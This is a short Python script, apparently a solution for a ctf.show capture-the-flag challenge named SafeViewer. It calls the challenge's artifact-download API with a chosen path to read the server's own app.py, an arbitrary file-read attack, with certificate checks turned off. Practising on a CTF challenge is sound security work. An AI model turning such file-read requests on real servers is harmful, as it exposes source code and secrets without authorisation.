import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url_base = "https://1de75a25-ddec-46aa-87f7-5dea6f47690d.challenge.ctf.show"

def download_file(path, filename):
    try:
        url = f"{url_base}/api/v1/artifacts"
        params = {"path": path, "filename": filename}
        print(f"Downloading {path}/{filename}...")
        r = requests.get(url, params=params, verify=False)
        if r.status_code == 200:
            print("Success!")
            print(r.text)
            with open(f"f:\\CTF\\CTF-wp\\ctfshow\\2026CS\\SafeViewer\\{filename}", "wb") as f:
                f.write(r.content)
        else:
            print(f"Failed with status {r.status_code}")
            print(r.text)
    except Exception as e:
        print(e)

download_file("/app", "app.py")
